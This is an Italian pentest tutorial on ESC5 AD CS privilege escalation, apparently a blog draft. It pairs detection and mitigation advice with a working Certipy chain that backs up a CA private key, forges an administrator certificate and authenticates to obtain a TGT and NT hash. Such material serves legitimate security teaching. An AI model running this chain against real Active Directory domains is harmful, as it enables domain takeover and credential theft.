---
title: 'ESC5 ADCS Privilege Escalation: Golden Certificate e CA Compromise con Certipy'
slug: esc5-adcs
description: 'ESC5 ADCS Privilege Escalation: compromettere la PKI Active Directory e forgiare Golden Certificate tramite la chiave privata della CA usando Certipy.'
image: /esc5.webp
draft: true
date: 2026-03-07T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - ad
  - adcs
  - certipy
  - esc
---

ESC5 è una tecnica di **Active Directory Privilege Escalation tramite AD CS** che sfrutta **ACL deboli su oggetti PKI in Active Directory**.

A differenza di:

* **ESC4 → ACL sui certificate template**
* **ESC7 → permessi sulla CA**

ESC5 riguarda **altri oggetti PKI nel Configuration container**.

***

# Dove si trovano questi oggetti

Gli oggetti PKI sono salvati in:

```
CN=Public Key Services,CN=Services,CN=Configuration
```

Esempi importanti:

```
CN=NTAuthCertificates
CN=AIA
CN=CDP
CN=Certification Authorities
CN=Certificate Templates
```

***

# Quando esiste ESC5

ESC5 esiste quando un utente ha permessi come:

```
WriteDACL
WriteOwner
WriteProperty
FullControl
```

su questi oggetti PKI.

Questo permette di **modificare il trust della PKI del dominio**.

***

# Attacchi possibili

Con accesso a questi oggetti l’attaccante può:

```
aggiungere una CA malevola
modificare trust PKI
alterare AIA/CDP
manipolare policy OID
```

Il caso più potente è modificare:

```
NTAuthCertificates
```

***

# NTAuthCertificates

Oggetto:

```
CN=NTAuthCertificates,CN=Public Key Services
```

Questo store contiene **le CA trusted per autenticazione AD**.

Se un attaccante inserisce una CA propria:

```
rogue CA
```

può emettere certificati validi per:

```
Kerberos PKINIT
Smartcard logon
```

***

# Identificazione ESC5

Certipy **non rileva ESC5 automaticamente**.

Serve analizzare ACL sugli oggetti PKI.

***

# Tool utili

### BloodHound

Con ADCS data collection.

***

### PowerShell

```powershell
Get-ACL "AD:\CN=NTAuthCertificates,CN=Public Key Services,..."
```

***

### ADSIEdit

Navigazione manuale.

***

# Oggetti da controllare

Audit su:

```
CN=NTAuthCertificates
CN=AIA
CN=CDP
CN=Certification Authorities
CN=Certificate Templates
```

Indicatori pericolosi:

```
Authenticated Users
Domain Users
```

con permessi di scrittura.

***

# Exploitation ESC5

ESC5 dipende molto dall’oggetto compromesso.

Un caso comune:

1️⃣ aggiungere rogue CA
2️⃣ emettere certificati admin
3️⃣ autenticarsi

***

# Compromissione CA key

Se l’attaccante ottiene la **chiave privata della CA**, può creare:

```
Golden Certificates
```

***

# Backup CA key con Certipy

```bash
certipy ca \
-u administrator@corp.local -p 'Passw0rd!' \
-ns 10.0.0.100 \
-target CA.CORP.LOCAL \
-config CA.CORP.LOCAL\CORP-CA \
-backup
```

Output:

```
Saving certificate and private key to CORP-CA.pfx
```

***

# Forging certificate

Con la chiave CA:

```bash
certipy forge \
-ca-pfx CORP-CA.pfx \
-upn administrator@corp.local \
-sid S-1-5-21-...-500 \
-crl ldap:///
```

Output:

```
administrator_forged.pfx
```

***

# Autenticazione

```bash
certipy auth \
-pfx administrator_forged.pfx \
-dc-ip 10.0.0.100
```

Output:

```
Got TGT
Got NT hash for administrator
```

Accesso ottenuto:

```
Domain Admin
```

***

# Impatto ESC5

ESC5 può portare a:

```
Enterprise Admin
Domain Admin
Golden Certificates
persistent domain compromise
```

È uno degli attacchi **più persistenti su AD CS**.

***

# Detection ESC5

Indicatori principali:

```
WriteDACL
WriteOwner
FullControl
```

su oggetti PKI.

Audit tramite:

```
BloodHound
ADSIEdit
PowerShell ACL review
```

***

# Mitigation ESC5

### Limitare ACL PKI

Solo gruppi come:

```
Enterprise Admins
PKI Admins
```

devono avere permessi.

***

### Audit periodico

Controllare ACL su:

```
CN=Public Key Services
```

***

### Monitor NTAuthCertificates

Modifiche a questo oggetto sono **critiche**.

***

### Hardening PKI

Limitare accesso a:

```
AIA
CDP
Certification Authorities
OID containers
```

***

# FAQ — ESC5 ADCS

### Cos'è ESC5?

ACL deboli su oggetti PKI in Active Directory.

### Qual è il rischio?

Modificare la **trust chain PKI del dominio**.

### ESC5 porta a Domain Admin?

Sì, e anche **Enterprise Admin**.

### ESC5 è comune?

Molto meno di ESC1 ma **molto più potente**.

***

**Key Takeaway:** se un attaccante può modificare oggetti PKI come NTAuthCertificates, può creare una CA trusted e generare certificati validi per autenticazione nel dominio.

***

> Guida completa AD CS escalation:
> [https://hackita.it/articoli/adcs-esc1-esc16](https://hackita.it/articoli/adcs-esc1-esc16)Continua con:
> [https://hackita.it/articoli/esc6-adcs](https://hackita.it/articoli/esc6-adcs) · [https://hackita.it/articoli/esc7-adcs](https://hackita.it/articoli/esc7-adcs)Supporta HackIta:
> [https://hackita.it/supporto](https://hackita.it/supporto)Pentest Active Directory o formazione offensiva:
> [https://hackita.it/servizi](https://hackita.it/servizi)Riferimenti tecnici:
> [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)
> [https://specterops.io/blog/2021/06/17/certified-pre-owned/](https://specterops.io/blog/2021/06/17/certified-pre-owned/)
